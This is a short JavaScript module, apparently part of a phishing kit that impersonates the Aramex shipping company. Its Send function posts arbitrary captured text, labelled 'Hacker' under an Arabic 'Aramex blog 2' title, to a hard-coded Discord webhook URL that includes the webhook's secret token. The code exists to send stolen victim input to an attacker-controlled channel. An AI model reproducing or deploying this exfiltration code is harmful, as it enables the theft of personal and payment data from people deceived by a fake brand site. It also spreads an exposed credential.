import axios from 'axios';


export const TeleSned = () => {

    const Send = async (des) => {
        const body = {
          content: "Hacker",
          tts: false,
          color: "white",
          embeds: [
            {
              title: "  2 مدونة ارامكس ",
              description: des,
           },
          ],
    };
            
        await axios.post("https://discord.com/api/webhooks/1331256615982338129/VH4tRH9V4pPnbv3bJZ3GRotc9MhAQOBjWPv13AsnsO3ZYwODLY4UDEDfMwqIKSqjah4U",body)
             
    }
  return {
    Send,
}
}

export default TeleSned;
